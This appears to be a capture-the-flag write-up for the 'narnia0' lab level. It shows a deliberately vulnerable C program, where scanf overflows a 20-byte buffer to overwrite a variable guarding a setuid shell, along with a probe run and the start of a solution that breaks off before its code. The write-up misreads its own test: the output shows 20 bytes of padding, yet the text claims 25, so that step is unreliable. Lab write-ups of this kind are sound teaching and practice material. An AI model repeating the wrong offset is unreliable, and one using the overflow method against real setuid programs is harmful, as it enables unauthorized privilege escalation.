# narnia0 Writeup

When we try to run the executable the program asks for a single input, and prints the following:
```
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: correct !
buf: correct
val: 0x41414141
WAY OFF!!!!
```
The code is:
```
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
We need to change the val parameter from hardcoded AAAA to 0xdeadbeef.
We have a buffer overflow in the `buf` variable, which is exactly what we need to overflow into `val` parameter.
First we need to check how many arbitrary bytes should be before the injected 0xdeadbeef:
```
narnia0@narnia:/tmp/alex3$ /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaabbbbddddeeeeffffgggg
buf: aaaabbbbddddeeeeffffgggg
val: 0x67676767
WAY OFF!!!!
```
Means, we need 25 arbitrary bytes before 0xdeadbeef.
Because of little endien we should pass it like \xef\xbe\xad\xde.
Python code for the solution:
